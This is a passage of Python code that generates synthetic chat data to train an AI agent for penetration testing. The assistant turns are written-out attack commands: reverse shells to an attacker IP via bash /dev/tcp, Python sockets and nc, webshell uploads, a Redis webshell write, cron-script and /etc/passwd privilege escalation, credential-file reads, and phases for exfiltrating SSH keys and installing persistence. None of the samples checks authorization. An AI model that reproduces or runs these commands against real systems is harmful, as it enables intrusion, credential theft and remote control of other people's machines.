         "decision": "RETRY", "next_cmd": "nmap -sV -sC -p 80 --script=http-enum,http-vuln* {ip}",
         "reasoning": "Basic version scan insufficient — retrying with NSE scripts for deeper HTTP enumeration"},
        {"prev_cmd": "sqlmap -u 'http://{ip}/page?id=1' --batch", "prev_reward": 0.0,
         "decision": "RETRY", "next_cmd": "sqlmap -u 'http://{ip}/page?id=1' --batch --level=5 --risk=3 --tamper=space2comment",
         "reasoning": "SQLmap with default settings found nothing — retrying with higher level/risk and WAF bypass tamper"},
        {"prev_cmd": "find / -perm -4000 2>/dev/null", "prev_reward": 0.0,
         "decision": "PIVOT", "next_cmd": "getcap -r / 2>/dev/null",
         "reasoning": "No exploitable SUID binaries — pivoting to Linux capabilities check for escalation"},
        {"prev_cmd": "crackmapexec smb {ip} -u admin -p password123", "prev_reward": -0.5,
         "decision": "RETRY", "next_cmd": "crackmapexec smb {ip} -u admin -p '' --shares",
         "reasoning": "SMB auth failed with guessed password — retrying with null password and share enumeration"},
        {"prev_cmd": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {ip}; run'", "prev_reward": 0.0,
         "decision": "ESCALATE", "next_cmd": "curl -u 'tomcat:tomcat' http://{ip}:8080/manager/html",
         "reasoning": "Metasploit module failed — escalating to manual credential testing on Tomcat manager"},
        {"prev_cmd": "nikto -h http://{ip}", "prev_reward": 0.0,
         "decision": "PIVOT", "next_cmd": "wpscan --url http://{ip} --enumerate u,p,t",
         "reasoning": "Generic scanner found nothing — pivoting to CMS-specific scanner based on observed WordPress indicators"},
        {"prev_cmd": "ssh admin@{ip}", "prev_reward": -1.0,
         "decision": "PIVOT", "next_cmd": "ftp {ip}",
         "reasoning": "SSH authentication denied — pivoting to FTP which may allow anonymous access"},
        {"prev_cmd": "enum4linux -a {ip}", "prev_reward": 0.0,
         "decision": "RETRY", "next_cmd": "smbclient -L //{ip}/ -N",
         "reasoning": "enum4linux returned no results — retrying with direct smbclient null session"},
        {"prev_cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "prev_reward": -1.0,
         "decision": "PIVOT", "next_cmd": r"find / -writable -type f 2>/dev/null | grep -E '(cron|\.sh|\.py)'",
         "reasoning": "Python setuid failed (no capability) — pivoting to check for writable cron jobs or scripts"},
        {"prev_cmd": "wget http://{ip}:8080/shell.war", "prev_reward": 0.0,
         "decision": "ESCALATE", "next_cmd": "curl -X PUT http://{ip}:8080/shell.jsp/ -d @webshell.jsp",
         "reasoning": "WAR deployment blocked — escalating to direct JSP upload via PUT method"},
        {"prev_cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "prev_reward": 0.0,
         "decision": "RETRY", "next_cmd": "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
         "reasoning": "John didn't crack with rockyou — retrying with hashcat and rule-based mutations for better coverage"},
        {"prev_cmd": "dirb http://{ip}/", "prev_reward": 0.5,
         "decision": "PIVOT", "next_cmd": "feroxbuster -u http://{ip}/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt --depth 3",
         "reasoning": "dirb found minimal paths — pivoting to feroxbuster with larger wordlist and recursive depth"},
        {"prev_cmd": "nmap --script vuln {ip}", "prev_reward": 0.0,
         "decision": "PIVOT", "next_cmd": "nuclei -target http://{ip} -t cves/ -t vulnerabilities/",
         "reasoning": "Nmap vuln scripts returned nothing — pivoting to nuclei for modern CVE scanning"},
        {"prev_cmd": "chisel client {ip}:8000 R:socks", "prev_reward": -1.0,
         "decision": "RETRY", "next_cmd": "chisel client {ip}:8000 R:1080:socks",
         "reasoning": "Chisel tunnel failed — retrying with explicit port binding specification"},
    ]

    for s in scenarios:
        for _ in range(rng.randint(6, 12)):
            ip = _rand_ip()
            phase = rng.choice(["ENUMERATION", "EXPLOITATION", "PRIVILEGE_ESCALATION"])
            agent = _pick_agent(phase, "retry_or_pivot")

            prev = s["prev_cmd"].replace("{ip}", ip)
            nxt = s["next_cmd"].replace("{ip}", ip)

            response = json.dumps({
                "decision": s["decision"],
                "action": nxt[:200],
                "reasoning": s["reasoning"],
                "confidence": round(rng.uniform(0.65, 0.92), 2),
            })

            samples.append(Sample(
                task="retry_or_pivot",
                messages=[
                    {"role": "system", "content": _sys("retry_or_pivot", agent)},
                    {"role": "user", "content": (
                        f"This command was unproductive:\n"
                        f"Command: {prev[:150]}\n"
                        f"Reward: {s['prev_reward']:.1f}\n\n"
                        f"State:\nPhase: {phase}\nTarget: {ip}\nStep: {rng.randint(10, 80)}\n\n"
                        f"What should we do next?"
                    )},
                    {"role": "assistant", "content": response},
                ],
                metadata={"decision": s["decision"], "synthetic": True, "agent": agent, "source": "synthetic_retry"},
                quality=0.9,
            ))

    return samples


def gen_synthetic_state_summaries() -> list[Sample]:
    """Synthetic state summaries for diverse engagement states."""
    samples = []
    rng = random.Random(SEED + 4)

    states = [
        {"phase": "RECON", "ev": {"ports": ["22", "80"], "services": [], "credentials": [], "vulns": [], "shells": []},
         "progress": "moderate", "blockers": [], "next": "Begin service version detection on open ports"},
        {"phase": "RECON", "ev": {"ports": [], "services": [], "credentials": [], "vulns": [], "shells": []},
         "progress": "stalled", "blockers": ["No ports discovered after 10 scan attempts"], "next": "Try UDP scan or alternative scanning technique"},
        {"phase": "ENUMERATION", "ev": {"ports": ["21", "22", "80", "3306"], "services": ["vsFTPd 3.0.3", "OpenSSH 8.2", "Apache 2.4.41", "MySQL 5.7"], "credentials": [], "vulns": [], "shells": []},
         "progress": "good", "blockers": [], "next": "Check for default credentials on MySQL and FTP anonymous access"},
        {"phase": "EXPLOITATION", "ev": {"ports": ["22", "80"], "services": ["OpenSSH 8.2", "Apache 2.4.49"], "credentials": ["admin:admin"], "vulns": ["Apache path traversal CVE-2021-41773"], "shells": []},
         "progress": "good", "blockers": [], "next": "Exploit Apache path traversal for initial shell access"},
        {"phase": "PRIVILEGE_ESCALATION", "ev": {"ports": ["22", "80"], "services": ["OpenSSH", "Apache"], "credentials": ["user:pass"], "vulns": ["python3 cap_setuid"], "shells": ["user@target"]},
         "progress": "good", "blockers": [], "next": "Exploit python3 cap_setuid to escalate to root"},
        {"phase": "POST_EXPLOITATION", "ev": {"ports": ["22", "80"], "services": [], "credentials": ["root:hash"], "vulns": [], "shells": ["root@target"]},
         "progress": "good", "blockers": [], "next": "Capture user.txt and root.txt flags"},
    ]

    for state in states:
        for _ in range(rng.randint(15, 30)):
            target = _rand_ip()
            agent = _pick_agent(state["phase"], "state_summary")

            ctx = f"Phase: {state['phase']}\nTarget: {target}\nStep: {rng.randint(5, 90)}"
            if state["ev"]["ports"]:
                ctx += f"\nPorts: {', '.join(state['ev']['ports'])}"
            if state["ev"]["services"]:
                ctx += f"\nServices: {', '.join(state['ev']['services'])}"
            if state["ev"]["credentials"]:
                ctx += f"\nCredentials: {', '.join(state['ev']['credentials'])}"
            if state["ev"]["shells"]:
                ctx += f"\nShells: {', '.join(state['ev']['shells'])}"

            response = json.dumps({
                "phase": state["phase"],
                "discoveries": state["ev"],
                "progress": state["progress"],
                "blockers": state["blockers"],
                "next_priority": state["next"],
            })

            samples.append(Sample(
                task="state_summary",
                messages=[
                    {"role": "system", "content": _sys("state_summary", agent)},
                    {"role": "user", "content": f"Summarize the engagement state:\n\n{ctx}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": state["phase"], "synthetic": True, "agent": agent, "source": "synthetic_state"},
                quality=0.88,
            ))

    return samples


def gen_synthetic_command_validate() -> list[Sample]:
    """Synthetic command validation — clearly valid and invalid pairings."""
    samples = []
    rng = random.Random(SEED + 5)

    # Phase-appropriate and inappropriate commands
    validations = [
        # Valid for RECON
        {"phase": "RECON", "cmd": "nmap -sV -sC -p- {ip}", "valid": True, "reasoning": "Full port scan appropriate for reconnaissance phase"},
        {"phase": "RECON", "cmd": "masscan {ip}/24 -p 1-65535 --rate=1000", "valid": True, "reasoning": "Fast port discovery across subnet during recon"},
        # Invalid for RECON
        {"phase": "RECON", "cmd": "sudo -l", "valid": False, "reasoning": "sudo check requires shell access — not available during recon", "alt": "nmap -sV -p- {ip}"},
        {"phase": "RECON", "cmd": "linpeas.sh", "valid": False, "reasoning": "Privilege escalation enumeration requires shell access", "alt": "nmap -sV {ip}"},
        # Valid for ENUMERATION
        {"phase": "ENUMERATION", "cmd": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt", "valid": True, "reasoning": "Web directory enumeration appropriate during service enumeration"},
        {"phase": "ENUMERATION", "cmd": "nikto -h http://{ip}", "valid": True, "reasoning": "Web vulnerability scanning fits enumeration phase"},
        # Invalid for ENUMERATION
        {"phase": "ENUMERATION", "cmd": "cat /etc/shadow", "valid": False, "reasoning": "Shadow file access requires root shell — not available during enumeration", "alt": "enum4linux -a {ip}"},
        # Valid for EXPLOITATION
        {"phase": "EXPLOITATION", "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt {ip} ssh", "valid": True, "reasoning": "Credential brute-force is a valid exploitation technique"},
        {"phase": "EXPLOITATION", "cmd": "sqlmap -u 'http://{ip}/page?id=1' --batch --os-shell", "valid": True, "reasoning": "SQL injection to OS shell aligns with exploitation objectives"},
        # Invalid for EXPLOITATION
        {"phase": "EXPLOITATION", "cmd": "nmap -sn 10.10.10.0/24", "valid": False, "reasoning": "Ping sweep is a recon activity — should be exploiting known vulnerabilities", "alt": "searchsploit apache 2.4.49"},
        # Valid for PRIV_ESC
        {"phase": "PRIVILEGE_ESCALATION", "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "valid": True, "reasoning": "Exploiting python3 cap_setuid for root escalation"},
        {"phase": "PRIVILEGE_ESCALATION", "cmd": "sudo vim -c ':!/bin/bash'", "valid": True, "reasoning": "Sudo vim escape for privilege escalation"},
    ]

    for v in validations:
        for _ in range(rng.randint(8, 15)):
            ip = _rand_ip()
            agent = _pick_agent(v["phase"], "command_validate")
            cmd = v["cmd"].replace("{ip}", ip)

            result: dict[str, Any] = {"valid": v["valid"], "reasoning": v["reasoning"]}
            if not v["valid"]:
                result["alternative"] = v.get("alt", "").replace("{ip}", ip)
            else:
                result["alternative"] = ""

            response = json.dumps(result)

            ctx = f"Phase: {v['phase']}\nTarget: {ip}\nStep: {rng.randint(5, 80)}"
            if v["phase"] in ("EXPLOITATION", "PRIVILEGE_ESCALATION"):
                ctx += "\nPorts: 22, 80, 445\nServices: OpenSSH 8.2, Apache 2.4.41"
            if v["phase"] == "PRIVILEGE_ESCALATION":
                ctx += "\nShells: user@target"

            samples.append(Sample(
                task="command_validate",
                messages=[
                    {"role": "system", "content": _sys("command_validate", agent)},
                    {"role": "user", "content": f"Validate this command:\nCommand: {cmd[:150]}\nPhase: {v['phase']}\n\n{ctx}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"valid": v["valid"], "phase": v["phase"], "synthetic": True, "agent": agent, "source": "synthetic_validate"},
                quality=0.92,
            ))

    return samples


def gen_synthetic_phase_classification() -> list[Sample]:
    """Synthetic phase classifications covering rare phases and edge cases."""
    samples = []
    rng = random.Random(SEED + 10)

    scenarios = [
        # RECON variants
        {"phase": "RECON", "ctx": "Step: 1/100\nNo ports discovered yet\nRunning initial host discovery", "reasoning": "initial engagement with no findings — host discovery phase", "conf": 0.95},
        {"phase": "RECON", "ctx": "Step: 3/100\nPorts: 22, 80\nServices: unknown\nRunning service detection", "reasoning": "ports found but services not yet identified — still in discovery", "conf": 0.85},
        # ENUMERATION variants
        {"phase": "ENUMERATION", "ctx": "Ports: 22, 80, 443, 3306, 8080\nServices: Apache 2.4, MySQL 5.7, Tomcat 9\nRunning nikto and gobuster", "reasoning": "services identified, actively fingerprinting and probing — service enumeration phase", "conf": 0.92},
        {"phase": "ENUMERATION", "ctx": "Ports: 139, 445\nServices: Samba 4.7\nRunning enum4linux\nUsers found: admin, backup", "reasoning": "SMB enumeration yielding user data — deep enumeration phase", "conf": 0.9},
        # EXPLOITATION variants
        {"phase": "EXPLOITATION", "ctx": "Vuln: SQL injection confirmed on /login\nRunning sqlmap --os-shell\nCredentials: admin:password", "reasoning": "actively exploiting confirmed vulnerability for initial access", "conf": 0.95},
        {"phase": "EXPLOITATION", "ctx": "Services: vsftpd 2.3.4\nRunning backdoor exploit\nAttempting connection to port 6200", "reasoning": "targeting known backdoor in service — active exploitation", "conf": 0.93},
        # PRIVILEGE_ESCALATION variants
        {"phase": "PRIVILEGE_ESCALATION", "ctx": "Shells: www-data@target\nSUID: python3.8 with cap_setuid\nRunning escalation", "reasoning": "user shell obtained, exploiting capability for root — privilege escalation", "conf": 0.96},
        {"phase": "PRIVILEGE_ESCALATION", "ctx": "Shells: user@target\nsudo -l: ALL NOPASSWD: /usr/bin/vim\nAttempting sudo escape", "reasoning": "sudo misconfiguration exploitation for elevated access", "conf": 0.94},
        # LATERAL_MOVEMENT (rare)
        {"phase": "LATERAL_MOVEMENT", "ctx": "Shells: root@10.10.10.5\nNew target: 10.10.10.20\nCredentials: admin:pass123\nRunning ssh to new host", "reasoning": "pivoting from compromised host to new target using discovered credentials", "conf": 0.91},
        {"phase": "LATERAL_MOVEMENT", "ctx": "Shells: root@host1\nSetting up chisel tunnel\nTarget: internal network 172.16.0.0/24", "reasoning": "establishing tunnel for access to internal network — lateral movement", "conf": 0.88},
        # POST_EXPLOITATION (rare)
        {"phase": "POST_EXPLOITATION", "ctx": "Shells: root@target\nExtracting /etc/shadow\nDumping database credentials\nSearching for flags", "reasoning": "root access achieved, harvesting credentials and sensitive data", "conf": 0.93},
        {"phase": "POST_EXPLOITATION", "ctx": "Shells: root@target\nFlags: user.txt captured\nSearching for root.txt\nInstalling persistence", "reasoning": "post-compromise data collection and persistence — post-exploitation phase", "conf": 0.9},
        # EXFILTRATION (rare)
        {"phase": "EXFILTRATION", "ctx": "Shells: root@target\nFlags: user.txt, root.txt both captured\nCopying SSH keys and shadow file", "reasoning": "both flags captured, exfiltrating proof of compromise data", "conf": 0.95},
        {"phase": "EXFILTRATION", "ctx": "Shells: root@target\nData: database dump, credentials, SSH keys\nEncoding for transfer", "reasoning": "packaging sensitive data for extraction — exfiltration phase", "conf": 0.92},
        # CLOSEOUT (rare)
        {"phase": "CLOSEOUT", "ctx": "Flags: user.txt, root.txt both captured\nAll objectives met\nDocumenting findings\nCleaning artifacts", "reasoning": "all engagement objectives met, documenting and cleaning up — closeout", "conf": 0.97},
        {"phase": "CLOSEOUT", "ctx": "Step: 98/100\nRoot obtained\nAll flags captured\nRemoving uploaded files\nFinal verification", "reasoning": "engagement complete, performing cleanup and final checks", "conf": 0.96},
    ]

    for s in scenarios:
        for _ in range(rng.randint(8, 15)):
            ip = _rand_ip()
            agent = _pick_agent(s["phase"], "phase_classification")

            ctx = f"Phase: {s['phase']}\nTarget: {ip}\n{s['ctx']}"
            response = json.dumps({
                "phase": s["phase"],
                "confidence": round(s["conf"] + rng.uniform(-0.05, 0.05), 2),
                "reasoning": s["reasoning"],
            })

            samples.append(Sample(
                task="phase_classification",
                messages=[
                    {"role": "system", "content": _sys("phase_classification", agent)},
                    {"role": "user", "content": f"Classify the attack phase:\n\n{ctx}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": s["phase"], "synthetic": True, "agent": agent, "source": "synthetic_phase"},
                quality=0.9,
            ))

    return samples


def gen_synthetic_next_step_advanced() -> list[Sample]:
    """Advanced synthetic next_step covering service-specific attacks and multi-step chains."""
    samples = []
    rng = random.Random(SEED + 11)

    attack_chains = [
        # Web application attacks
        {"phase": "ENUMERATION", "ctx": "Ports: 80\nServices: Apache 2.4\nGobuster found /admin, /api, /uploads",
         "action": "curl -X POST http://{ip}/api/login -d '{\"username\":\"admin\",\"password\":\"admin\"}' -H 'Content-Type: application/json'",
         "reasoning": "Testing default credentials on discovered API login endpoint",
         "alts": ["ffuf -u http://{ip}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", "nikto -h http://{ip}/admin"]},
        {"phase": "EXPLOITATION", "ctx": "Ports: 80\nServices: PHP 7.4, Apache\nVuln: LFI on /page?file=",
         "action": "curl 'http://{ip}/page?file=../../../../../../../etc/passwd'",
         "reasoning": "Exploiting confirmed Local File Inclusion to read system files",
         "alts": ["curl 'http://{ip}/page?file=../../../../../../../var/log/apache2/access.log'", "curl 'http://{ip}/page?file=php://filter/convert.base64-encode/resource=/etc/passwd'"]},
        {"phase": "EXPLOITATION", "ctx": "Ports: 80\nServices: PHP\nVuln: Unrestricted file upload on /uploads",
         "action": "curl -F 'file=@webshell.php;type=image/jpeg' http://{ip}/uploads/upload.php",
         "reasoning": "Uploading PHP webshell via unrestricted upload endpoint — MIME type spoofing for bypass",
         "alts": ["curl -F 'file=@shell.phtml' http://{ip}/uploads/upload.php", "echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php"]},
        # Database attacks
        {"phase": "EXPLOITATION", "ctx": "Ports: 3306\nServices: MySQL 5.7\nCredentials: root:root",
         "action": "mysql -h {ip} -u root -proot -e \"SELECT load_file('/etc/shadow');\"",
         "reasoning": "Using MySQL FILE privilege to read shadow file for credential extraction",
         "alts": ["mysql -h {ip} -u root -proot -e 'SELECT * FROM mysql.user;'", "mysql -h {ip} -u root -proot webapp -e 'SHOW TABLES;'"]},
        {"phase": "EXPLOITATION", "ctx": "Ports: 5432\nServices: PostgreSQL 13\nCredentials: postgres:postgres",
         "action": "psql -h {ip} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';\"",
         "reasoning": "PostgreSQL COPY TO PROGRAM for OS command execution via database",
         "alts": ["psql -h {ip} -U postgres -c '\\dt'", "psql -h {ip} -U postgres -c 'SELECT version();'"]},
        # Container/Docker attacks
        {"phase": "PRIVILEGE_ESCALATION", "ctx": "Shells: user@target\nGroups: user docker\nDocker socket accessible",
         "action": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
         "reasoning": "Docker group membership allows mounting host filesystem for root access",
         "alts": ["docker images", "docker run -v /root:/mnt --rm alpine cat /mnt/root.txt"]},
        # Reverse shell payloads
        {"phase": "EXPLOITATION", "ctx": "Vuln: RCE confirmed via command injection\nListening on 4444",
         "action": "bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'",
         "reasoning": "Bash reverse shell to attacker machine for interactive access",
         "alts": ["python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                  "nc -e /bin/bash 10.10.14.1 4444"]},
        # Network service attacks
        {"phase": "EXPLOITATION", "ctx": "Ports: 6379\nServices: Redis 6.0 (no auth required)",
         "action": "redis-cli -h {ip} CONFIG SET dir /var/www/html && redis-cli -h {ip} CONFIG SET dbfilename shell.php && redis-cli -h {ip} SET payload '<?php system($_GET[\"cmd\"]); ?>' && redis-cli -h {ip} BGSAVE",
         "reasoning": "Redis unauthenticated write to web directory for webshell deployment",
         "alts": ["redis-cli -h {ip} INFO", "redis-cli -h {ip} CONFIG SET dir /root/.ssh/"]},
        {"phase": "EXPLOITATION", "ctx": "Ports: 11211\nServices: Memcached (no auth)",
         "action": "echo 'stats items' | nc {ip} 11211 && echo 'stats cachedump 1 100' | nc {ip} 11211",
         "reasoning": "Dumping Memcached cache for credentials and session tokens",
         "alts": ["echo 'version' | nc {ip} 11211"]},
        # Kerberoasting / AD attacks
        {"phase": "EXPLOITATION", "ctx": "Ports: 88, 389, 445\nServices: Active Directory\nCredentials: user:Password1",
         "action": "impacket-GetUserSPNs -request -dc-ip {ip} DOMAIN/user:Password1",
         "reasoning": "Kerberoasting — requesting service tickets for offline password cracking",
         "alts": ["bloodhound-python -d DOMAIN -u user -p Password1 -ns {ip} -c all", "ldapsearch -x -H ldap://{ip} -D 'user@DOMAIN' -w 'Password1' -b 'DC=domain,DC=local'"]},
        # Network pivoting
        {"phase": "LATERAL_MOVEMENT", "ctx": "Shells: root@10.10.10.5\nInternal network: 172.16.0.0/24\nTarget: 172.16.0.10",
         "action": "chisel server -p 8000 --reverse & ssh -D 1080 -N -f user@10.10.10.5",
         "reasoning": "Setting up SOCKS proxy through compromised host for internal network access",
         "alts": ["proxychains nmap -sT -p 22,80,445 172.16.0.10", "socat TCP-LISTEN:8080,fork TCP:172.16.0.10:80"]},
        # Privesc via cron
        {"phase": "PRIVILEGE_ESCALATION", "ctx": "Shells: user@target\nCron: root runs /opt/scripts/backup.sh every 5 min\n/opt/scripts/ writable by user",
         "action": "echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /opt/scripts/backup.sh",
         "reasoning": "Hijacking writable cron script to create SUID bash — root in 5 minutes",
         "alts": ["echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /opt/scripts/backup.sh", "cat /etc/crontab"]},
        # Privesc via writable /etc/passwd
        {"phase": "PRIVILEGE_ESCALATION", "ctx": "Shells: user@target\n/etc/passwd writable\nLooking for escalation",
         "action": "echo 'root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd && su root2",
         "reasoning": "Writable /etc/passwd allows adding root-equivalent user",
         "alts": ["openssl passwd -1 toor", "cat /etc/passwd | grep root"]},
        # NFS misconfiguration
        {"phase": "EXPLOITATION", "ctx": "Ports: 2049\nServices: NFS\nshowmount -e shows /home (no_root_squash)",
         "action": "mount -t nfs {ip}:/home /mnt && cp /bin/bash /mnt/user/bash_suid && chmod +s /mnt/user/bash_suid",
         "reasoning": "NFS no_root_squash allows creating SUID binary on target filesystem",
         "alts": ["showmount -e {ip}", "mount -t nfs {ip}:/home /mnt && ls -la /mnt/"]},
    ]

    for chain in attack_chains:
        for _ in range(rng.randint(5, 10)):
            ip = _rand_ip()
            agent = _pick_agent(chain["phase"], "next_step")
            action = chain["action"].replace("{ip}", ip)
            alts = [a.replace("{ip}", ip)[:150] for a in chain.get("alts", [])]

            ctx = f"Phase: {chain['phase']}\nTarget: {ip}\nStep: {rng.randint(5, 80)}\n{chain['ctx']}"
            response = json.dumps({
                "action": action[:200],
                "reasoning": chain["reasoning"][:200],
                "phase_fit": round(rng.uniform(0.8, 0.98), 2),
                "alternatives": alts[:2],
            })

            samples.append(Sample(
                task="next_step",
                messages=[
                    {"role": "system", "content": _sys("next_step", agent)},
                    {"role": "user", "content": f"Current engagement state:\n{ctx}\n\nSuggest the next action."},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": chain["phase"], "synthetic": True, "agent": agent, "source": "synthetic_advanced_next"},
                quality=0.93,
            ))

    return samples


def gen_synthetic_postmortems() -> list[Sample]:
    """Synthetic postmortem analysis for diverse engagement outcomes."""
    samples = []
    rng = random.Random(SEED + 6)

    scenarios = [
        {"summary": "FTP anonymous access led to credential file, SSH login, python3 cap_setuid root",
         "wins": ["Found credentials via anonymous FTP", "Escalated to root via python3 capability"],
         "fails": ["Spent 5 steps on web scanning with no results"],
         "root_cause": "Initially focused on HTTP instead of checking FTP anonymous access first",
         "missed": ["FTP anonymous access should be checked early", "Version-specific CVE check was skipped"],
         "corrected": ["Check FTP anonymous first", "Run targeted version scanning", "Check capabilities immediately on shell"],
         "lesson": "When FTP is open: always check anonymous access before brute-forcing"},
        {"summary": "SQL injection on login page led to database dump, credential reuse for SSH, kernel exploit for root",
         "wins": ["Found SQL injection in login form", "Extracted admin credentials from database"],
         "fails": ["Wasted time on directory brute-forcing", "Initial manual SQLi attempts failed"],
         "root_cause": "Manual SQL injection testing was inconsistent — should have used sqlmap from the start",
         "missed": ["Login forms are prime SQL injection targets", "Database credentials often reused for SSH"],
         "corrected": ["Test all input forms with sqlmap", "Try credential reuse on all services", "Check kernel version for exploits"],
         "lesson": "When login form exists: always test for SQL injection with automated tools"},
        {"summary": "SMB null session revealed users, password spray found valid credential, psexec for shell",
         "wins": ["Null session enumeration successful", "Password spray against discovered users worked"],
         "fails": ["Tried SSH before discovering SMB", "Missed share enumeration initially"],
         "root_cause": "SSH focus delayed SMB investigation which had the actual attack path",
         "missed": ["SMB null session is a quick check with high value", "User enumeration enables targeted password attacks"],
         "corrected": ["Check SMB null session early", "Enumerate users before password attacks", "Use crackmapexec for systematic testing"],
         "lesson": "When SMB ports (139/445) are open: check null session and enumerate shares/users immediately"},
        {"summary": "WordPress vulnerable plugin gave webshell, www-data to root via sudo misconfiguration",
         "wins": ["Identified WordPress CMS", "Found vulnerable plugin via wpscan"],
         "fails": ["General directory scanning missed WordPress paths", "Nikto was too slow"],
         "root_cause": "Generic scanning tools missed CMS-specific vulnerabilities",
         "missed": ["CMS detection should trigger CMS-specific scanner", "sudo -l should be first privesc check"],
         "corrected": ["Detect CMS type first", "Run CMS-specific scanner (wpscan, droopescan)", "Check sudo immediately on shell access"],
         "lesson": "When web CMS detected: use specific scanner (wpscan/droopescan) instead of generic tools"},
        {"summary": "PCAP file on web server contained FTP credentials, SSH login, cron job escalation to root",
         "wins": ["Found PCAP download endpoint", "Extracted credentials from network capture"],
         "fails": ["Initially tried to brute-force SSH", "Missed PCAP analysis for 3 steps"],
         "root_cause": "Brute-force approach before exhausting information gathering from available files",
         "missed": ["PCAP files can contain cleartext credentials", "Check web downloads for sensitive files"],
         "corrected": ["Download and analyze all files served by web app", "Use tshark for protocol-specific credential extraction", "Check cron jobs for privesc"],
         "lesson": "When downloadable files are served: analyze PCAP/backup files for credentials before brute-forcing"},
        {"summary": "Target fully firewalled except SSH — weak password gave access, kernel exploit gave root",
         "wins": ["Persistent SSH brute-force with targeted usernames", "Kernel CVE exploitation successful"],
         "fails": ["Extensive port scanning found only SSH", "Web scanning wasted time on filtered ports"],
         "root_cause": "Heavily filtered target with minimal attack surface — success required persistence on SSH",
         "missed": ["SSH-only targets need focused credential attacks", "Kernel version should be checked immediately on access"],
         "corrected": ["Accept minimal attack surface and focus efforts", "Build targeted username wordlist", "Check kernel version for known exploits on shell access"],
         "lesson": "When only SSH is available: focus on credential attacks with custom wordlists rather than scanning filtered ports"},
        {"summary": "Stalled at enumeration — no credentials, no vulnerabilities, eventually found LFI via parameter fuzzing",
         "wins": ["Parameter fuzzing revealed Local File Inclusion", "LFI to RCE via log poisoning"],
         "fails": ["Standard directory scanning ineffective", "Spent too long on known-service CVEs that didn't apply"],
         "root_cause": "Over-reliance on known CVE scanning when the vulnerability was a custom application issue",
         "missed": ["Parameter fuzzing should be tried when directory scanning stalls", "LFI can lead to RCE via log poisoning"],
         "corrected": ["When web scanning stalls: fuzz URL parameters", "Try LFI payloads on all GET parameters", "Use log poisoning for shell if LFI confirmed"],
         "lesson": "When standard scanning fails: fuzz URL parameters for injection points (LFI/RFI/SSRF)"},
    ]

    for s in scenarios:
        for _ in range(rng.randint(4, 8)):
            run_id = f"synthetic_{rng.randint(100000, 999999)}"

            response = json.dumps({
                "root_cause": s["root_cause"][:200],
                "missed_signals": s["missed"][:5],
                "corrected_path": s["corrected"][:5],
                "key_lesson": s["lesson"][:200],
            })

            user_prompt = (
                f"Analyze this penetration testing engagement:\n\n"
                f"Run: {run_id}\n"
                f"Summary: {s['summary']}\n"
                f"Successes: {'; '.join(s['wins'][:3])}\n"
                f"Failures: {'; '.join(s['fails'][:3])}\n"
            )

            samples.append(Sample(
                task="postmortem",
                messages=[
                    {"role": "system", "content": _sys("postmortem", "OrionAgent")},
                    {"role": "user", "content": user_prompt},
                    {"role": "assistant", "content": response},
                ],
                metadata={"run_id": run_id, "synthetic": True, "agent": "OrionAgent", "source": "synthetic_postmortem"},
                quality=0.92,
            ))

    return samples


def gen_synthetic_retrieval_reasoning() -> list[Sample]:
    """Expanded synthetic retrieval reasoning scenarios."""
    samples = []
    rng = random.Random(SEED + 7)

    patterns = [
        {"phase": "RECON", "state": "Ports: 22, 80\nServices: unknown", "memory": "Similar targets often run Python web frameworks. Check for Werkzeug debug console at /console.",
         "synthesis": "Port 80 may host Python web framework with debug endpoint exposure", "action": "curl -s http://{ip}/ | grep -iE 'werkzeug|flask|django'"},
        {"phase": "RECON", "state": "Ports: 21, 22, 80, 139, 445\nServices: detecting...", "memory": "Multi-service targets: FTP anonymous first, then SMB null session, then web enum.",
         "synthesis": "Rich attack surface — prioritize quick wins: FTP anonymous and SMB null session", "action": "ftp {ip} -n <<EOF\nuser anonymous\npass\nls\nEOF"},
        {"phase": "ENUMERATION", "state": "Ports: 22, 80, 3306\nServices: Apache 2.4, MySQL 5.7", "memory": "MySQL default credentials frequently work on lab targets: root:root, root:'', admin:admin.",
         "synthesis": "MySQL with potential default credentials — quick check before brute-forcing", "action": "mysql -h {ip} -u root -e 'SHOW DATABASES;' 2>/dev/null"},
        {"phase": "ENUMERATION", "state": "Ports: 80, 443\nServices: Apache, WordPress detected", "memory": "WordPress sites: use wpscan for plugin enumeration. wp-file-manager < 6.9 has RCE (CVE-2020-25213).",
         "synthesis": "WordPress CMS confirmed — wpscan will enumerate vulnerable plugins efficiently", "action": "wpscan --url http://{ip} --enumerate u,ap,t --plugins-detection aggressive"},
        {"phase": "EXPLOITATION", "state": "Vuln: vsftpd 2.3.4 detected\nServices: vsFTPd 2.3.4", "memory": "vsftpd 2.3.4 has backdoor — send :) in USER field to trigger shell on port 6200.",
         "synthesis": "Known backdoor in vsftpd 2.3.4 — guaranteed shell via port 6200", "action": "ncat {ip} 6200 -v"},
        {"phase": "EXPLOITATION", "state": "Vuln: Apache 2.4.49 path traversal\nServices: Apache 2.4.49", "memory": "CVE-2021-41773: curl path traversal for /etc/passwd, then RCE via cgi-bin.",
